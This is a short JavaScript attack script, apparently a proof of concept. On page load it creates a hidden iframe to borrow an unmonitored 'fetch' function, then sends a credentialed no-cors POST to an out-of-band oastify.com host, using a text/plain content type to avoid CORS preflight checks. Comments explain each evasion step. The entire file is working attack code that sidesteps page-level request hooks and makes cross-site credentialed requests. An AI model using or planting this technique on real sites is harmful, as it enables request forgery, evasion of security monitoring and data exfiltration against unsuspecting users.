
//fetch bypass
function runIframeBypass() {
    console.log("⏳ Starting Bypass Sequence...");

    // B. Configuration
    const targetUrl = "https://ivh5wczjrrhb67ofib3qokx6cxio6eu3.oastify.com";
    
    const payload = {
        "evilJSON": {
            "value": "hacked"
        },
    };

    // C. The Hack: Create invisible iframe to get a clean 'fetch'
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    // Borrow the clean fetch function
    const cleanFetch = iframe.contentWindow.fetch;

    console.log("🚀 Sending Request via Clean Iframe (no-cors)...");

    // D. Execution
    cleanFetch(targetUrl, {
        method: "POST",
        mode: 'no-cors', // <--- IMPORTANT: The Blindfold
        credentials: 'include', 
        headers: {
            // 'application/json' is forbidden in no-cors. 
            // We use 'text/plain' to skip checks, but the body is still valid JSON string.
            'Content-Type': 'text/plain' 
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        // In no-cors, response.status is always 0 and body is null.
        // We cannot read the response, but entering this .then() means the send succeeded.
        console.log("✅ Request Sent Successfully (Response is Opaque/Unreadable due to no-cors)");
    })
    .catch(err => {
        console.error("❌ Request Failed:", err);
    })
    .finally(() => {
        // Cleanup: Remove iframe after a short delay
        setTimeout(() => {
            if (document.body.contains(iframe)) {
                document.body.removeChild(iframe);
            }
        }, 2000);
    });
}

// --- 3. MAIN EXECUTION ---

document.addEventListener('DOMContentLoaded', () => {
    console.log("🤖 Script Loaded.");

    // Run the Bypass (Small delay ensures DOM is ready)
    setTimeout(() => {
    runIframeBypass();
    }, 500);
});
